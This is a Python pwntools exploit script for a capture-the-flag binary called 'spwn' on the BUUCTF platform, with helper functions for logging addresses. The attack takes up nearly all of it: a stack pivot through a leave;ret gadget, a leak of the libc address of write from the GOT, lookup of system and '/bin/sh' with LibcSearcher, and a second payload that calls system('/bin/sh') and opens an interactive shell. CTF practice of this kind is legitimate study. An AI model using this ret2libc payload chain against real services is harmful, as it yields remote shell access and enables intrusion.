from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'spwn'
port = 27117

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io)#, gdbscript='b *0x804849B\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'
log.success('='*100)
##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
首先进行栈迁移
'''
fake_ebp_addr = 0x804A300
leave_ret_addr = 0x08048408
pop3_addr = 0x080485a9
write_plt = io_elf.plt['write']
write_got = io_elf.got['write']
read_plt = io_elf.plt['read']
main_addr = io_elf.sym['main']
vuln_addr = io_elf.sym['vul_function']



io.recvuntil('What is your name?')
payload = p32(fake_ebp_addr + 0x50)
payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x4)
# payload += p32(read_plt) + p32(pop3_addr) + p32(0) + p32(fake_ebp_addr) + p32(0x20) + p32(main_addr)
# payload += p32(fake_ebp_addr) * 11
io.sendline(payload)

io.recvuntil('What do you want to say?')
payload = 0x18 * b'a'
payload += p32(fake_ebp_addr) + p32(leave_ret_addr)
io.send(payload)
message = io.recv()
print(message)

write_actual_addr = message[0:4]
write_actual_addr = u32(write_actual_addr.ljust(4, b'\x00'))
libc = LibcSearcher('write', write_actual_addr)

libc_base = write_actual_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

LOG_ADDR_SUCCESS('libc_base', libc_base)
LOG_ADDR_SUCCESS('system_addr', system_addr)
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

###### 第二次
# io.recvuntil('What is your name?')
payload = p32(fake_ebp_addr + 0x30)
payload += p32(system_addr) + p32(main_addr) + p32(str_bin_sh)
io.sendline(payload)

# io.recvuntil('What do you want to say?')
payload = 0x18 * b'a'
payload += p32(0x804A300) + p32(leave_ret_addr)
io.send(payload)
io.interactive()
